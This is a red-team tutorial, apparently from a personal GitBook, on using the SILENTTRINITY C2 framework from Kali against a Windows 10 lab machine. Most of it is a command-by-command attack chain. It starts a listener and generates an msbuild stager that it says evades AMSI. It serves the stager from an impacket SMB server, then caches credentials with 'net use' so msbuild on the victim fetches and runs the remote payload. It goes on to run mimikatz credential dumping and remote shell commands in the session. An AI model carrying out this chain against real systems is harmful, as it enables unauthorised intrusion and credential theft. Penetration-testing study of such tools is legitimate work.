---
description: Using Kali as a C2 Server
---

# SILENTTRINITY

SILENTTRINITY is a tool made by [byt3bl33d3r](https://twitter.com/byt3bl33d3r) which uses Ironpython for awesome C2 and post exploitation. I'll refer to it as ST in this article.

{% embed url="https://github.com/byt3bl33d3r/SILENTTRINITY" caption="" %}

## Installation

Install the tool and its dependencies, then start it. I've included the manual installation of the latest and greatest [impacket ](https://github.com/SecureAuthCorp/impacket)here too.

{% code-tabs %}
{% code-tabs-item title="hacker@kali" %}
```text
#Install deps
cd /opt
git clone https://github.com/SecureAuthCorp/impacket.git 
cd impacket
pip install -r requirements.txt
python setup.py install

#Install ST
apt install python3.7 python3.7-dev python3-pip
git clone https://github.com/byt3bl33d3r/SILENTTRINITY
cd SILENTTRINITY/Server
python3.7 -m pip install -r requirements.txt

#Start it up
python3.7 st.py
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![Ready to go](../.gitbook/assets/image-31.png)

## Listening

Proceed with selecting a listener, binding it to an IP + port and starting it. And btw I set my BindIP to a different subnet because I am connected to my test lab using VPN. Nothing magic going on.

{% code-tabs %}
{% code-tabs-item title="hacker@st" %}
```text
listeners
list
use http
options
set BindIP 10.0.8.6
start
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-56.png)

## Staging

Proceed to generate a stager. It will end up in the `/opt/SILENTTRINITY/Server` directory.

{% code-tabs %}
{% code-tabs-item title="hacker@st" %}
```text
stagers
list
use msbuild
generate http
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-42.png)

![](../.gitbook/assets/image-11.png)

## Execution

Now, find an appropriate way of downloading and triggering the stager. As per November 2018, the msbuild stager payloads still haven't triggered AMSI on Windows 10 1803.

### Serving the payload

A neat trick is using an SMB server for serving the payload. Download and trigger it it with `msbuild` and the UNC path to your SMB server as argument.

First create a share folder and then start the SMB server from impacket.

{% code-tabs %}
{% code-tabs-item title="hacker@kali" %}
```text
mkdir /opt/SMB
smbserver.py SMB /opt/SMB -username hacker -password hacker -smb2support -ip 10.0.8.6
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-1.png)

### Triggering the payload

Now we try to trigger the payload with msbuild, but it fails because we aren't authenticated.

{% code-tabs %}
{% code-tabs-item title="victim@target" %}
```text
cp /opt/SILENTTRINITY/Server/msbuild.xml /opt/SMB/msbuild.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe \\10.0.8.6\SMB\msbuild.xml
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-34.png)

### Caching credentials

So why did we specify credentials then? On Windows 10 you can't use SMB unauthenticated by default. And as far as I know there isn't a way to give msbuild credentials directly. So I fiddled around and find a little trick to cache some credentials for my SMB server on the host. As you see I use hacker/hacker for authentication. Very secure of course. On the target, trigger an authenticated `net use` command. This should try to access the SMB share with the specified credentials, and therefore cache them locally on the target. From an opsec perspective this isn’t ideal, so if you have suggestions please reach out.

{% code-tabs %}
{% code-tabs-item title="victim@target" %}
```text
net use \\10.0.8.6\smb /user:hacker hacker
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-32.png)

We see that we get a successful authentication and a NetNTLMv2 hash instantly. So now with cached credentials on the target, let's try to trigger our payload again.

![](../.gitbook/assets/image-12.png)

Voila! Something started happening. Let's check back in ST.

![](../.gitbook/assets/image-36.png)

Like sweet magic, we got a session. The authentication reuses the credentials that were cached.

## Modules

Now we list the session we just acquired. Because I triggered the payload from an elevated shell, we have a session with elevated privileges. That allows us to do things like dump credentials and other kinds of post exploitation fun.

{% code-tabs %}
{% code-tabs-item title="hacker@st" %}
```text
sessions
list
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-41.png)

So let's explore some of the post exploitation modules that ST has to offer. As you can see, ST has a lot of built in modules already and by the looks of it, there are more to come.

![](../.gitbook/assets/image-2.png)

Let's select the `mimikatz` module and run it towards our session. Word of notice here, you have to copy the GUID from the session list so you have it ready. You can alternatively use `run all` to run it on all session, if you have several sessions.

{% code-tabs %}
{% code-tabs-item title="hacker@st" %}
```text
modules
list
use mimikatz
options
run GUID
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-27.png)

Running the shell module for good measure

{% code-tabs %}
{% code-tabs-item title="hacker@st" %}
```text
modules
use shell
options
set Command whoami
run GUID
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-47.png)

Trying the execute-assembly module with [Watson](https://github.com/rasta-mouse/Watson). Actually noticed at this point that ST starts autocompleting the GUID for the session I'm working on. Right arrow on the keyboard to complete it.

{% code-tabs %}
{% code-tabs-item title="hacker@st" %}
```text
modules
use execute-assembly
options
set Assembly /opt/Watson.exe
run GUID
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/image-3.png)

![](../.gitbook/assets/image-7.png)

Didn't find anything on my patched Windows 10 1803 VM, but that's ok.

Thanks [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) for an awesome C2 platform.

